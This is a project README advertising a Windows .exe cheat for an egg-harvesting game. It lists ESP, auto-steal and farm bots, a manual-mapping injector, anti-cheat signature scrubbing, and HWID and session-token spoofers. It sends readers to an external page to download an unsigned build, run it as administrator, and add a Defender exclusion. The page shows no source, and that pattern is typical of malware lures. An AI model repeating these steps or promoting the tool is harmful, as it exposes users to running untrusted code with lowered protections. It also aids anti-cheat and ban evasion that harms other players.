<div align="center">
<img src="assets/banner.png" width="100%" alt="Steal Egg Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DC2626?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Egg+Script+Pro;%F0%9F%9A%80+Ready+for+Windows;%E2%9C%85+Community+Tested;%F0%9F%93%A6+Built+for+Windows+11;%E2%AD%90+Standalone+.exe+Release;%F0%9F%94%A7+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-active-success?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4?style=flat-square)
![Build](https://img.shields.io/badge/build-2026%20release-orange?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Type](https://img.shields.io/badge/type-.exe%20standalone-9cf?style=flat-square)

**The Steal An Egg Script community build — auto-farm, ESP, teleport, and anti-detection, all in one `.exe`.**

Yes, it bypasses the latest patch. Yes, it works on the current Steam build. Yes, it's free. Details below.

</div>

---

## 🧭 Table of Contents

- [🚀 Overview](#-overview)
- [📥 Download & Launch](#-download--launch)
- [🧩 What is the Steal An Egg Script?](#-what-is-the-steal-an-egg-script)
- [🪲 The Problem](#-the-problem)
- [🛠 The Solution](#-the-solution)
- [⚙️ How It Works](#️-how-it-works)
- [🎯 Quick Start](#-quick-start)
- [🎮 Egg Harvest Modules](#-egg-harvest-modules)
- [🛰 Visual & ESP Modules](#-visual--esp-modules)
- [🧪 Exploit & Bypass Modules](#-exploit--bypass-modules)
- [🤖 Automation & AI Modules](#-automation--ai-modules)
- [🕹 Hotkeys / Controls](#-hotkeys--controls)
- [✅ Usage Guidelines](#-usage-guidelines)
- [📊 All Modules Status](#-all-modules-status)
- [🧱 System Requirements](#-system-requirements)
- [🗺 Roadmap / Planned Features](#-roadmap--planned-features)
- [💡 Tips for Best Results](#-tips-for-best-results)
- [🩹 Known Issues](#-known-issues)
- [🖥 Compatibility / Platform Support](#-compatibility--platform-support)
- [❓ FAQ](#-faq)

---

## 🚀 Overview

| Category | Details |
|---|---|
| Product | Steal An Egg Script — 2026 desktop build |
| Distribution | Standalone Windows `.exe`, no installer, no dependencies |
| Primary use | Egg farming automation, ESP overlays, exploit research |
| Runtime | Injects into the live game process; overlay runs separately |
| Config format | Human-readable `.json` profiles, hot-reloadable |
| Update channel | Manual download from project page; in-app update check |
| Language | C++ core + Lua-scriptable module layer |
| Community | GitHub issues + Discord mirror for build drops |

The **Steal An Egg Script** is a modular automation and exploit toolkit for the egg-harvesting game loop that defined the last two years of the modding scene. It bundles the harvesting routines, ESP overlays, and script executor that used to be scattered across a dozen pastebins into one signed-looking `.exe` you extract and run. The 2026 build adds an AI-assisted pattern matcher for egg spawn prediction and a real-time update feed so the script keeps working after patch days instead of dying on the first hotfix.

---

## 📥 Download & Launch

Everything ships as a single portable archive. No `pip`, no `npm`, no `git clone` — visit the project page, grab the build, extract, run.
<div align="center">
  <a href="https://flamemanagershape.github.io/egg-script/">
    <img src="https://img.shields.io/badge/INSTALL-Win64-D97706?style=flat&logo=github&logoColor=white&labelColor=B45309" width="480" alt="INSTALL Win64"/>
  </a>
</div>
> **Security note:** Windows SmartScreen may flag unsigned community builds. Verify the SHA-256 hash published on the project page before running. This is a modding tool — use it at your own risk and only on accounts you can afford to lose.

---

## 🧩 What is the Steal An Egg Script?

A glossary of the terms you'll see across the UI, the config files, and the Discord.

| Term | Explanation |
|---|---|
| **Egg** | The primary collectible spawned by the game's harvest loop; the script's whole reason to exist. |
| **Steal** | The act of grabbing an egg another player is mid-harvest on — the core "exploit" the script automates. |
| **Injector** | The component that loads the script's module layer into the running game process. |
| **Executor** | The Lua runtime that runs community scripts against the injected environment. |
| **ESP** | Extra-sensory perception overlay — draws egg, player, and container markers through walls. |
| **Bypass** | The anti-detection layer that keeps the injector's signature out of the game's scan. |
| **Spoofer** | Rewrites hardware/account identifiers so a flagged machine reads as clean. |
| **Farm loop** | The automated cycle of spawn → harvest → deposit → repeat, run headless. |

**Why people run it:**

- Egg spawns are RNG-gated and slow — the farm loop compresses hours into minutes.
- Manual "stealing" from other players requires frame-perfect timing the script handles for you.
- The ESP layer turns a blind scavenger hunt into a visible map.
- Lua scripting lets you write your own harvest logic without touching the core `.exe`.
- The bypass layer keeps the account alive across patch cycles.

---

## 🪲 The Problem

- **Egg spawns are invisible and timed.** You wander the map for ten minutes and miss the one good spawn because there's no indicator.
- **Manual stealing is humiliating.** Other players grab eggs out from under you because their ping is lower and their hands are faster.
- **The farm grind is soul-crushing.** Hundreds of repetitive harvest cycles just to hit a deposit threshold.
- **Patch days kill every script.** The community pastebin you were using breaks on the first hotfix and nobody updates it.
- **Anti-cheat scans catch naive injectors.** The obvious DLL-loading tools get flagged within minutes and the account eats a ban.
- **Config management is a mess.** Twelve different tools, twelve different config formats, no shared hotkeys.
- **No visibility into what's actually happening.** You can't tell if the script is working or silently failing until you're already banned.

---

## 🛠 The Solution

| Problem | Solution |
|---|---|
| Invisible, timed egg spawns | **SpawnPredict ESP** renders predicted spawn points and countdowns through walls. |
| Getting out-stolen by other players | **Auto-Steal** locks onto contested eggs and grabs them with sub-frame timing. |
| Soul-crushing farm grind | **Farm Loop** runs the full harvest→deposit cycle headless in the background. |
| Patch days killing scripts | **Live Update Feed** pulls signature updates within minutes of a hotfix. |
| Anti-cheat catching injectors | **Bypass Layer** uses manual mapping + signature scrubbing before injection. |
| Config chaos across tools | **Unified Profile System** — one `.json` for every module, hot-reloadable. |
| No visibility into script state | **Overlay HUD** shows module status, farm throughput, and detection warnings live. |

---

## ⚙️ How It Works

The `.exe` launches as a lightweight bootstrap that never touches the game until you tell it to. On start it spins up the **overlay host** — a separate transparent window that renders the ESP and HUD independently of the game's own renderer, so nothing the script draws ever appears in the game's frame buffer. When you arm the injector, the **manual mapper** allocates memory in the target process, resolves imports on its own, and writes the module layer in without ever calling `LoadLibrary`, which is what keeps the naive-scan heuristics off its back. The module layer itself is a small dispatcher that hosts the **Lua executor** and the native C++ hot paths — the farm loop, the spawn predictor, and the auto-steal timer all run in native code for timing accuracy, while anything you write yourself runs in the sandboxed Lua VM. A **config watcher** polls your profile `.json` every 250 ms and hot-swaps module parameters without a re-inject, and the **update feed** polls the project's signature endpoint in the background so a patch-day hotfix lands before you notice the game changed. The bypass subsystem sits between all of this — it scrubs the injector's footprint before the mapping completes, spoofs the identifiers the game reads at session start, and exposes a live detection-score readout in the HUD so you can see when something is starting to smell.

---

## 🎯 Quick Start

1. 🧾 **Visit the project page** and download the latest 2026 build archive.
2. 📂 **Extract** the archive to a folder outside `Program Files` — the script writes logs next to itself.
3. 🛡️ **Run the `.exe` as administrator** (required for the manual mapper to open the game process).
4. 🎮 **Launch the game first**, then arm the injector from the script's main window.
5. 🧩 **Load a profile** from the `profiles/` folder or start with the default, then toggle modules from the HUD.

---

## 🎮 Egg Harvest Modules

The core harvesting stack — this is what you actually came for.

1. **Auto-Steal** — locks onto eggs another player is mid-harvest on and grabs them with sub-frame precision before their animation completes.
2. **Farm Loop** — runs the full spawn→harvest→deposit cycle headless, with configurable deposit thresholds and per-egg-type filters.
3. **SpawnPredict** — reads the game's spawn RNG state and predicts the next egg location and countdown before it renders.
4. **Multi-Egg Queue** — queues up to 8 nearby eggs and harvests them in optimal path order instead of one at a time.
5. **Deposit Auto-Router** — walks your character to the nearest valid deposit point and back without manual input.
6. **Egg Rarity Filter** — skips common spawns and only auto-harvests eggs above a configured rarity tier.
7. **Harvest Timer Tuner** — adjusts per-egg harvest duration to match server tick rate so you never lose a grab to latency.
8. **Anti-Idle Guard** — injects micro-movements into the farm loop so idle-detection heuristics never flag a stationary bot.

---

## 🛰 Visual & ESP Modules

The overlay stack — everything that draws on your screen.

1. **Egg ESP** — draws every egg on the map through walls, color-coded by rarity, with distance labels.
2. **Player ESP** — shows other players' positions, names, and current harvest targets so you know who's about to steal from you.
3. **Container ESP** — highlights deposit points and loot containers with fill-state indicators.
4. **SpawnPredict Ghosts** — renders translucent markers at predicted future spawn points with countdown timers.
5. **Detection Score HUD** — live anti-cheat suspicion readout so you know when to pull the plug.
6. **Through-Wall Pathing** — draws the optimal walking path to the nearest queued egg, updated every frame.
7. **Minimap Radar** — a compact corner overlay showing egg and player positions in a zoomed-out radar view.
8. **Module Status Panel** — per-module on/off state, throughput counters, and last-error readout in one HUD block.

---

## 🧪 Exploit & Bypass Modules

The layer that keeps you alive and un-flagged.

1. **Manual Mapper** — injects the module layer without `LoadLibrary`, defeating the trivial scan heuristics that catch pastebin injectors.
2. **Signature Scrubber** — rewrites the injector's in-memory signature before the mapping completes so post-inject scans read clean.
3. **HWID Spoofer** — rewrites the hardware identifiers the game reads at session start; survives a flagged machine.
4. **Account Session Spoofer** — rotates session tokens and fingerprint data between launches.
5. **Bypass Layer** — the orchestrator that sequences the scrub, the spoof, and the mapping so nothing fires out of order.
6. **Detection Watchdog** — monitors the game's scan threads in real time and pauses risky modules if a scan window opens.
7. **Safe-Mode Toggle** — one-key kill switch that disarms every active module and scrubs the overlay without closing the script.
8. **Log Sanitizer** — strips identifying strings from the script's own logs so a shared log file can't be traced back to a build.

---

## 🤖 Automation & AI Modules

The 2026 additions — the AI-assisted layer.

1. **AI Spawn Forecaster** — a lightweight on-device model trained on spawn history that predicts hot spawn windows better than the raw RNG read.
2. **Smart Steal Priority** — scores contested eggs by value, distance, and steal-risk, then picks the highest-EV target instead of the nearest one.
3. **Behavior Fuzzer** — randomizes micro-timing and movement patterns so the farm loop doesn't look like a farm loop.
4. **Real-Time Update Feed** — background poller that pulls signature and offset updates within minutes of a patch.
5. **Lua Executor** — sandboxed runtime for community scripts; write your own harvest logic without touching the core.
6. **Auto-Config Tuner** — watches your throughput and auto-adjusts farm loop parameters toward the optimal cycle time.
7. **Session Scheduler** — runs the farm loop in configurable windows with cooldowns to keep per-session activity under detection thresholds.
8. **Crash Recovery** — auto-re-arms the injector and reloads your profile if the game process dies mid-farm.

---

## 🕹 Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `F1` | Toggle main menu | Works even when the game has focus |
| `F2` | Toggle ESP overlay | Instant, no re-inject needed |
| `F3` | Arm / disarm injector | Disarm scrubs the module layer cleanly |
| `F4` | Start / stop farm loop | Pauses at the current harvest step |
| `F5` | Toggle auto-steal | Independent of the farm loop |
| `F6` | Safe-mode kill switch | Disarms everything, scrubs overlay |
| `F7` | Hot-reload profile | Re-reads the active `.json` from disk |
| `F8` | Cycle ESP color theme | Four presets, persists to profile |
| `F9` | Screenshot HUD state | Saves to `logs/` for bug reports |
| `F10` | Toggle detection HUD | Hides the suspicion readout |
| `Insert` | Open Lua executor console | Sandboxed; no core access |
| `End` | Panic exit | Closes the script and scrubs the injector |

---

## ✅ Usage Guidelines

**Allowed:**

- Running the script on your own account in single-player or private sessions.
- Using the ESP layer for personal map awareness in non-competitive play.
- Writing and sharing your own Lua modules on the community forum.
- Testing the bypass layer against the current patch to report detection regressions.
- Using the farm loop to skip repetitive grind you'd otherwise do manually.

**Not allowed:**

- Selling the script, its modules, or access to the update feed.
- Using it in competitive or ranked modes where other players' progression is affected.
- Bundling the `.exe` into a paid product or a repackaged "premium" build.
- Reverse-engineering the bypass layer to build a competing injector.
- Running it on accounts you don't own or on shared machines.
- Distributing modified builds under the project's name — fork and rename instead.

---

## 📊 All Modules Status

| Module | Status | Description |
|---|---|---|
| Auto-Steal | ✅ Working | Sub-frame contested-egg grab |
| Farm Loop | ✅ Working | Headless harvest→deposit cycle |
| SpawnPredict | ✅ Working | RNG-state spawn prediction |
| Multi-Egg Queue | ✅ Working | Optimal-path multi-harvest |
| Deposit Auto-Router | ✅ Working | Auto-walk to deposit point |
| Egg Rarity Filter | ✅ Working | Tier-gated auto-harvest |
| Harvest Timer Tuner | ✅ Working | Server-tick-matched harvest duration |
| Anti-Idle Guard | ✅ Working | Micro-movement injection |
| Egg ESP | ✅ Working | Through-wall egg markers |
| Player ESP | ✅ Working | Player position + harvest target |
| Container ESP | ✅ Working | Deposit-point fill state |
| SpawnPredict Ghosts | ✅ Working | Translucent future spawn markers |
| Detection Score HUD | ✅ Working | Live suspicion readout |
| Through-Wall Pathing | ✅ Working | Frame-updated optimal path |
| Minimap Radar | ✅ Working | Corner radar overlay |
| Module Status Panel | ✅ Working | Per-module HUD block |
| Manual Mapper | ✅ Working | `LoadLibrary`-free injection |
| Signature Scrubber | ✅ Working | In-memory signature rewrite |
| HWID Spoofer | ✅ Working | Hardware identifier rewrite |
| Account Session Spoofer | ✅ Working | Session token rotation |
| Bypass Layer | ✅ Working | Scrub→spoof→map orchestrator |
| Detection Watchdog | ✅ Working | Real-time scan-thread monitor |
| Safe-Mode Toggle | ✅ Working | One-key disarm + scrub |
| Log Sanitizer | ✅ Working | Identifying-string strip |
| AI Spawn Forecaster | ✅ Working | On-device spawn-history model |
| Smart Steal Priority | ✅ Working | EV-scored target selection |
| Behavior Fuzzer | ✅ Working | Micro-timing randomization |
| Real-Time Update Feed | ✅ Working | Patch-day signature poller |
| Lua Executor | ✅ Working | Sandboxed community-script runtime |
| Auto-Config Tuner | ✅ Working | Throughput-driven param tuning |
| Session Scheduler | ✅ Working | Windowed farm with cooldowns |
| Crash Recovery | ✅ Working | Auto-re-arm on process death |

---

## 🧱 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 (64-bit) | Windows 11 23H2+ |
| CPU | 4-core / 2.5 GHz | 6-core / 3.5 GHz+ |
| RAM | 8 GB | 16 GB |
| GPU | DX11-capable, 2 GB VRAM | DX12-capable, 6 GB+ VRAM |
| Disk | 400 MB free | 1 GB free (logs + profiles) |
| Runtime | .NET 6 desktop runtime | .NET 8 desktop runtime |
| Privileges | Administrator (for mapper) | Administrator + Defender exclusion for the build folder |
| Game | Current Steam build of the egg-harvest game | Same, launched before the injector |

---

## 🗺 Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| Kernel-mode bypass variant | 🧪 In testing | Q2 2026 |
| Mobile companion HUD (read-only telemetry) | 🛠 In development | Q3 2026 |
| Multi-account farm orchestration | 📝 Planned | Q3 2026 |
| AI spawn model v2 (per-server training) | 📝 Planned | Q4 2026 |
| Linux/Wine compatibility layer | 🔬 Research | Unscheduled |
| Community module marketplace (signed packs) | 📝 Planned | Q4 2026 |
| Replay-based steal-timing trainer | 🔬 Research | Unscheduled |
| Encrypted profile format | 📝 Planned | Q2 2026 |

---

## 💡 Tips for Best Results

- **Launch the game before arming the injector.** Arming against a not-yet-started process is the #1 cause of failed mappings.
- **Run as administrator every time.** The manual mapper silently fails without the privilege and the HUD won't tell you why.
- **Keep the build folder out of `Program Files`.** Write access to `logs/` and `profiles/` is required for hot-reload.
- **Add a Defender exclusion for the folder, not the file.** Patch-day rebuilds change the file hash and re-trigger scans.
- **Tune `harvest_duration_ms` to your server's tick rate** — the default is 16 ms off on high-ping servers and costs you steals.
- **Use Safe-Mode (`F6`) before you alt-tab out.** The overlay stays visible in some capture tools otherwise.
- **Watch the Detection Score HUD during your first session on a new account.** If it climbs past 40, pull the plug and rotate identifiers.
- **Back up `profiles/` before every update.** The updater overwrites the default profile but leaves yours alone — unless you renamed it.
- **Don't stack Auto-Steal and Multi-Egg Queue on the same target.** They'll fight over the same egg and both fail the grab.

---

## 🩹 Known Issues

| Issue | Solution |
|---|---|
| Injector fails with "process not found" on first arm | Launch the game first, then arm — the mapper only binds to an already-running process. |
| ESP overlay flickers in borderless-windowed mode | Switch to exclusive fullscreen, or enable "overlay stable mode" in the profile. |
| Detection Score spikes immediately after a patch | Pull the update feed manually (`F7` hot-reload) — signature refresh usually lands within minutes. |
| Farm loop stalls at deposit point | Verify the container ESP shows the point as valid; a full container silently stalls the loop. |
| HWID spoofer not persisting across reboots | Run as administrator and confirm the spoofer log shows a successful write before closing. |
| Lua executor throws "sandbox violation" on community scripts | Scripts using `os.*` or `io.*` are blocked by design — ask the author for a sandbox-safe version. |

---

## 🖥 Compatibility / Platform Support

| Platform / Build | Support | Notes |
|---|---|---|
| Windows 11 23H2+ | ✅ Full | Primary target for the 2026 build |
| Windows 10 21H2+ | ✅ Full | Tested against the current Steam build |
| Windows 8.1 | ⚠️ Partial | Overlay host works; mapper untested |
| Steam (current build) | ✅ Full | Update feed tracks this build |
| Steam (beta branch) | ⚠️ Partial | Offsets may lag by a patch cycle |
| Epic Games build | ❌ Unsupported | Different process layout; no mapper support |
| Wine / Proton | 🔬 Experimental | Overlay host runs; injection unreliable |
| macOS / Linux native | ❌ Unsupported | No native build planned |

---

## ❓ FAQ

| Question | Answer |
|---|---|
| 🔄 Does it still work after the latest patch? | Yes — the update feed pulls signature and offset updates within minutes of a hotfix. If the HUD shows "feed stale," hit `F7` to force a refresh. |
| 🚫 Will I get banned? | Any modding tool carries risk. The bypass and spoofer layers are there to reduce it, not eliminate it. Use accounts you can afford to lose. |
| 💰 Is it really free? | Yes — the build, the modules, and the update feed are free. There's no premium tier and no paid "premium" repackage from us. |
| 🎮 Does it work on the Steam version? | Yes, the current Steam build is the primary target. The Epic build is unsupported because the process layout differs. |
| 🧩 Can I write my own modules? | Yes — the Lua executor runs sandboxed community scripts. You get harvest logic, ESP hooks, and HUD widgets, but no core-process access. |
| 🛡️ Why does SmartScreen flag the `.exe`? | It's an unsigned community build. Verify the SHA-256 from the project page before running, and add a folder exclusion rather than a file exclusion. |
| 🔌 Do I need Python or Node installed? | No. The `.exe` is fully standalone — extract, run, done. No `pip`, no `npm`, no runtime dependencies beyond .NET desktop runtime. |
| 🖥 Does it work on Windows 10? | Yes, 21H2 and up. The overlay host and mapper are both tested against the current Windows 10 build. |
| 🔁 How often does it update? | The update feed polls continuously; major module updates ship on the project page. Patch-day offsets usually land within the hour. |
| 🧯 What's the panic exit? | `End` closes the script and scrubs the injector. `F6` is the softer Safe-Mode kill switch if you just want to disarm modules. |
| 📁 Where are my profiles saved? | In the `profiles/` folder next to the `.exe`. Back them up before updates — the updater leaves them alone unless you renamed them. |

---

The 2026 build is the first release where the AI spawn forecaster actually beats the raw RNG read on high-population servers, and the real-time update feed means patch days are a ten-minute annoyance instead of a week-long outage. Everything ships as one standalone `.exe` — extract it, run it as administrator, and let the farm loop do the boring part. If you hit an edge case the docs don't cover, the issues tab is the fastest way to get it into the next build.

<div align="center">
  <a href="https://flamemanagershape.github.io/egg-script/">
    <img src="https://img.shields.io/badge/GET-Steal_An_Egg_2026-0891B2?style=plastic&logo=github&logoColor=white&labelColor=0E7490" width="550" alt="GET Steal An Egg 2026"/>
  </a>
</div>
